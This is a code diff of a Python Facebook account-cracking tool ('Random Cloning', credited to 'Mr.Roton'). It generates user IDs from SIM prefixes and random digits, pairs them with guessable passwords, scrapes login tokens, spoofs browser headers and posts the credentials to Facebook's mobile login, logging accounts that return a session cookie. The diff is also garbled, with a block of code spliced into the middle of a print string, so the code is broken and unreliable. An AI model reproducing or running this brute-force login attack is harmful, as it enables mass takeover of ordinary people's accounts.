@@ -132,7 +132,7 @@ logo=("""
 \x1b[38;5;46m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆
 \033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mDeveloper \033[1;31m●\x1b[38;5;46mMr.Roton
 \033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mFacebook  \033[1;31m●\x1b[38;5;46mMr.Roton
-\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mVersion  \033[1;31m ●\x1b[38;5;46m0.1
+\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mVersion  \033[1;31m ●\x1b[38;5;46m0.2
 \033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mTools  \033[1;31m   ●\x1b[38;5;46mRandom Cloning
 \033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mType  \033[1;31m    ●\x1b[38;5;46mPaid
 \x1b[38;5;50m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆""")
@@ -187,7 +187,37 @@ def v2():
         print(logo)
         tl = str(len(user))
         print('\033[1;31m[\033[1;32m=\033[1;31m]\x1b[38;5;46m SIM CODE : '+kode)
-        print('\033[1;31m[\033[1;32m=\033[1;31m]\x1b[38;5;46m CRACK ID : '+tl)
+        print('\033[1;31m[\033[1;32m=\033[1;3guru
+            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'304050','607080']
+            akash.submit(rcrack1,uid,pwx,tl)
+    print(linex)
+    print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK SUCCESSFULLY COMPLETED..')
+    print(linex)
+#--------------------------(MATHOD BOX)--------------------------#
+def rcrack1(uid,pwx,tl):
+    global loop
+    global cps
+    global oks
+    global proxy
+    try:
+        for ps in pwx:
+            pro = random.choice(ugen)
+            session = requests.Session()
+            bi = random.choice([A,B,C,D,E,F,G,H])
+            sys.stdout.write(f'\r \033[1;31m[%sMr.Roton\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
+            sys.stdout.flush()
+            free_fb = session.get('https://free.facebook.com').text
+            log_data = {
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":uid,
+            "pass":ps,
+            "login":"Log In"}
+            1m]\x1b[38;5;46m CRACK ID : '+tl)
         print('\x1b[38;5;46m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆')
         for guru in user:
             uid = kode+kodex+kod+guru
@@ -220,27 +250,23 @@ def rcrack1(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'm.facebook.com',
-           'method': 'GET',
-           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-           'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
-           'cache-control': 'max-age=0',
-           'dpr': '2.625',
-           'referer': 'https://www.facebook.com/',
-           'sec-ch-prefers-color-scheme': 'dark',
-           'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
-           'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
-           'sec-ch-ua-mobile': '?0',
-           'sec-ch-ua-model': '""',
-           'sec-ch-ua-platform': '"Linux"',
-           'sec-ch-ua-platform-version': '""',
-           'sec-fetch-dest': 'document',
-           'sec-fetch-mode': 'navigate',
-           'sec-fetch-site': 'same-origin',
-           'sec-fetch-user': '?1',
-           'upgrade-insecure-requests': '1',
-           'user-agent': pro}
-
+            header_freefb = {"authority": 'm.facebook.com',
+            "method": 'GET',
+            "scheme": 'https',
+            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
+            "accept-encoding": 'gzip, deflate, br',
+            "accept-language": 'en-US,en;q=1',
+            'cache-control': 'no-cache, no-store, must-revalidate',
+            "referer": 'https://m.free.facebook.com/',
+            "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
+            "sec-ch-ua-mobile": '?0',
+            "sec-ch-ua-platform": "Windows",
+            "sec-fetch-dest": 'document',
+            "sec-fetch-mode": 'navigate',
+            "sec-fetch-site": 'none',
+            "sec-fetch-user": '?1',
+            "upgrade-insecure-requests": '1',
+            "user-agent": pro}
             lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
